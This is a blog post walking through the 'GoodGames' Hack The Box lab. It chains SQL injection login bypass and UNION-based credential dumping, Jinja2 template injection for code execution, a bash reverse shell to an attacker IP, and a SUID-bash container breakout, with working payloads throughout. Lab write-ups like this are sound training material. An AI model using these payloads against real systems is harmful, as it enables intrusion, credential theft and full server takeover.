# GoodGames

\*\*Not a Member?? Click Here to Read Full-Story!\*\*

***

### 🚀 From Login Form to Root Access: Chaining SQLi & SSTI for Total Compromise

![](https://cdn-images-1.medium.com/max/800/1*q_zXakJCJZdibF_8YKg8pA.png)

**Target:** _GoodGames (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ Attack Vectors: _Web Exploitation -> Container Breakout_ **Author:** _R00t3dbyFa17h\Nicholas Mullenski_

⚠️ **Disclaimer:** This article is for educational and security auditing purposes only. All demonstrations were performed on the “GoodGames” machine within the Hack The Box lab environment. Never attempt to access or modify systems without explicit written permission from the owner.

### Executive Summary

This assessment targeted “GoodGames,” a Linux-based server hosting a gaming review platform. The initial foothold was achieved by identifying a critical **SQL Injection (SQLi)** vulnerability within the application’s login mechanism, allowing for authentication bypass. Further analysis of the authenticated user dashboard revealed a **Server-Side Template Injection (SSTI)** vulnerability in the user profile settings, which was exploited to execute arbitrary code and gain a shell inside a Docker container.

Root privilege escalation was accomplished by enumerating the container environment and discovering that the host’s root filesystem was mounted within the container. This misconfiguration allowed for a container breakout, granting full administrative access (Root) to the underlying host system.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance and Enumeration

1. **1.1 Scanning the Target:** The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target.

```
nmap -sC -sV -A -vvv -p- 10.10.11.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-20 12:01 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Syn Stealth Scan at 12:01
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 12:03, 26.50s elapsed
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
```

**1.1.2 Key Findings:**

* **Port 80 (HTTP):** The primary attack vector. The header `Werkzeug/2.0.2 Python/3.9.2` confirms this is a Python-based web application (Flask).

#### 1.2 Web Application Enumeration

1. **2.1 Analysis:** Navigating to `http://goodgames.htb` reveals a gaming news site. The application features a login page (`/login`) and a registration page (`/signup`).

![](https://cdn-images-1.medium.com/max/800/1*TWzWJ-9Uo5A1-M1BiBI47Q.png)

**1.2.2 Vulnerability Identification (SQL Injection):** We tested the login form for standard SQL injection flaws. By intercepting the login request with Burp Suite and modifying the `email` parameter, we observed that the application was susceptible to boolean-based SQL injection.

**1.2.3 Exploitation:** We utilized a classic authentication bypass payload.

* **Payload:** `' OR 1=1 -- -`
* **Result:** The application accepted the condition as true and logged us in as the first user in the database (Admin), bypassing the password requirement entirely.

![](https://cdn-images-1.medium.com/max/800/1*04LHBlxYyohaNkJRstDZMg.png)

#### 1.3 Advanced Exploitation (Data Exfiltration)

**1.3.1 Determining the Injection Type:** While the initial `OR 1=1` payload granted access, we observed that the application reflected the user's name on the dashboard ("Welcome \[Name]"). This behavior suggested that the results of the SQL query were being displayed on the page, making it a prime candidate for a **UNION-based SQL Injection**.

**1.3.2 Enumeration:** We intercepted the login request in Burp Suite to fuzz the query.

* **Column Count:** We injected `ORDER BY` clauses and `UNION SELECT` statements to determine the number of columns in the original query.
* **Payload:** `' UNION SELECT 1,2,3,4-- -`
* **Result:** The page responded with “Welcome 4”. This confirmed the query uses **4 columns** and the **4th column** is the one displayed to the user.

![](https://cdn-images-1.medium.com/max/800/0*a5Ot8n5yQGW3Ii4f)

**1.3.3 Database Dumping:** Leveraging the 4th column as our data extraction point, we began enumerating the schema.

* **Current Database:**
* **Payload:** `' UNION SELECT 1,2,3,database()-- -`
* **Result:** `main`

#### **Listing Tables:**

* **Payload:**

```
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema='main'-- -
```

* **Result:** `blog, blog_comments, user`

#### **Listing Columns (User Table):**

* **Payload:**

```
' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='user'-- -
```

* **Result:** `id, email, password, name`

**1.3.4 Dumping Credentials:** Finally, we extracted the data from the `user` table.

* **Payload:**

```
' UNION SELECT 1,2,3,group_concat(id,':',email,':',password) FROM user-- -
```

Result:

```
1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
```

#### 1.4 Password Cracking

**1.4.1 Hash Identification:** We successfully extracted the administrator’s password hash: `2b22337f218b2d82dfc3b6f77e7cb8ec`. Based on the length and format, this was identified as a standard **MD5** hash.

![](https://cdn-images-1.medium.com/max/800/1*09G9sWbsYxXQsmDO4C9RRA.png)

**1.4.2 Cracking:** We checked the hash against online databases (or used hashcat).

* **Hash:** `2b22337f218b2d82dfc3b6f77e7cb8ec`
* **Cracked Value:** `superadministrator`

![](https://cdn-images-1.medium.com/max/800/1*cb_9JrDNeh7dUzBnZdi9iA.png)

**1.4.3 Strategic Value:** Even though we could bypass the login with SQLi, cracking this password is critical. Users often reuse passwords across services (SSH, Database, Root). We noted this credential (`admin:superadministrator`) for later use.

### 2.0 Exploitation (SSTI to RCE)

#### 2.1 Internal Reconnaissance

With the `admin` credentials (`admin:superadministrator`), we logged into the web application. The dashboard provides a "Settings" gear icon in the top right, leading to [`http://goodgames.htb/settings`](http://goodgames.htb/settings.)[.](http://goodgames.htb/settings.)

This page allows the user to update their “Full Name.”

![](https://cdn-images-1.medium.com/max/800/1*22rkL5Ge5kBwsN8ZfWWClA.png)

**2.1.1 Testing for SSTI:** Since we know the backend is Python/Flask (from the Nmap headers), we tested the “Full Name” input field for Server-Side Template Injection (SSTI) using a Jinja2 payload: `{{7*7}}`.

![](https://cdn-images-1.medium.com/max/800/1*QFMuMPW2y2rqveQVdqcn7Q.png)

**2.1.2 Verification:** Upon saving the profile, the page reflected the name as `49` instead of `{{7*7}}`. This confirmed that the server was evaluating our input as code rather than text.

![](https://cdn-images-1.medium.com/max/800/1*nEbARQda-zu5cF1BqJmlrw.png)

### 2.2 Remote Code Execution

**2.2.1 Payload Construction:** To upgrade this injection to a full shell, we crafted a standard Python SSTI payload to execute system commands.

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**2.2.2 Execution:** The server responded with `uid=0(root) gid=0(root) groups=0(root)`.

* _Note:_ Although we are “root,” the environment looked suspicious. The hostname was a random hash (e.g., `3a453...`), indicating we were inside a Docker container, not the actual host.

**2.2.2 Gaining a Reverse Shell:** We set up a listener on our attack box (`nc -lvnp 4444`) and injected a bash reverse shell payload.

* **Payload**

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"').read() }}
```

_(Replace_ _`10.10.14.x`_ _with your specific tun0 IP)._

**2.3 User Flag:** The shell connected back successfully. We found the user flag in the home directory of the user `augustus`.

```
root@3a453ab39d3d:/backend# cd /home/augustus
root@3a453ab39d3d:/home/augustus# cat user.txt
1b7383d84375fedc50b590d0fd3a22f7
```

### 3.0 Privilege Escalation (Docker Breakout)

#### 3.1 Container Enumeration

**3.1.1 Environment Analysis:** Despite having root access (`uid=0`), the environment indicators—such as the random hostname `3a453ab39d3d` and limited process list—confirmed we were inside a Docker container.

**3.1.2 Network Discovery:** To identify the host system, we examined the network interfaces.

```
root@3a453ab39d3d:/backend# ip a
# (Output shows IP 172.19.0.2, implying Gateway/Host is 172.19.0.1)
```

**3.1.3** A connectivity check confirmed the host (`172.19.0.1`) was reachable and had Port 22 (SSH) open.

```
root@3a453ab39d3d:/backend# ping -c 1 172.19.0.1
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.119 ms
```

**3.1.4** We utilized a bash loop to scan the gateway for open ports:

```
root@3a453ab39d3d:/backend# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open
```

#### 3.2 Vulnerability Identification (Mount Misconfiguration)

**3.2.1** We checked the mounted file systems using `df -h`. For a clearer view.

```
root@3a453ab39d3d:/backend# df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.3G  4.5G  1.5G  76% /home/augustus
```

### 4.0 Privilege Escalation (Root)

#### 4.1 Vulnerability Chaining

**4.1.1** We are `augustus` on the host, but `root` inside the container. Since the file system is shared, we can create a file as `root` inside the container and execute it as `augustus` on the host.

#### 4.2 The Library Mismatch Error

**4.2.1** We initially tried copying `/bin/bash` from the container to the host.

```
augustus@GoodGames:~$ ./secret_shell -p
./secret_shell: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
```

**4.2.2** This failed due to OS differences between the container (Debian) and Host (Ubuntu).

#### 4.3 The Fix (Using Host Bash)

We copied the **Host’s** bash binary instead.

**4.3.1 On Host (Augustus):** Copy the system bash to the home folder.

```
cp /bin/bash /home/augustus/rootbash
```

**4.3.2 Inside Container (Root):** Change ownership and set the SUID bit.

```
chown root:root /home/augustus/rootbash
chmod 4777 /home/augustus/rootbash
```

**4.3.3 On Host (Augustus):** Execute the SUID binary.

```
./rootbash -p
```

#### 4.4 Root Flag:

```
rootbash-5.1# id
euid=0(root)
rootbash-5.1# cat /root/root.txt
904af4cf2d1b2d0f0394e32e66df33f6
```

![](https://cdn-images-1.medium.com/max/800/1*Lssa7qRvsigccCIpNQCNsw.png)

### 5.0 Executive Conclusion

This assessment of the “GoodGames” infrastructure highlights a critical reality in modern cybersecurity: **complexity increases risk.**

While the initial entry point was a standard web vulnerability (SQL Injection), the true severity of the breach stemmed from a failure in **infrastructure isolation**. The organization deployed Docker containers to segment the application — a best practice in theory — but negated that security by misconfiguring file system mounts. This oversight allowed an attacker to move laterally from a low-priority web service to full administrative control of the host server.

**Key Takeaways for Leadership:**

1. **Defense in Depth is Mandatory:** Relying solely on a firewall or a container is insufficient. Security controls must exist at the application layer (Input Validation), the host layer (Least Privilege), and the network layer (Segmentation).
2. **Configuration Management:** The most dangerous vulnerabilities often aren’t “bugs” in the code, but misconfigurations in the deployment (e.g., the Docker mount). Regular auditing of infrastructure-as-code is essential.
3. **The Cost of Inaction:** A breach of this magnitude allows for total data exfiltration, ransomware deployment, and persistent backdoors, posing a severe reputational and financial risk to the organization.

As a penetration tester, my role is not just to break in, but to identify these structural weaknesses and provide actionable roadmaps to harden the organization against real-world threats.

***

### 6.0 The Spiritual & CyberSecurity Tie-in

> “Above all else, guard your heart, for everything you do flows from it.”\* — \*_**Proverbs 4:23 (NIV)**_

**The Connection:** In this lab, the “heart” of the application — its database and internal logic — was left unguarded. The developers allowed raw, unfiltered input to flow directly into the SQL database and the Template Engine. Furthermore, the Docker container was intended to be a secure vessel, but because the internal file system (the heart of the host’s data) was mounted insecurely, the boundary was breached.

Just as Proverbs warns that a corrupted heart affects everything a person does, the corrupted input here allowed us to compromise the entire “body” of the server. Security is not just about the walls on the outside, but guarding what flows in and out of the center.

**“Guard the input, isolate the process, secure the heart.”**

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 27, 2025](https://medium.com/p/11c77f0d3539).

[Canonical link](https://medium.com/@nicholasmullenski/from-login-form-to-root-access-chaining-sqli-ssti-for-total-compromise-11c77f0d3539)

Exported from [Medium](https://medium.com) on September 1, 2026.
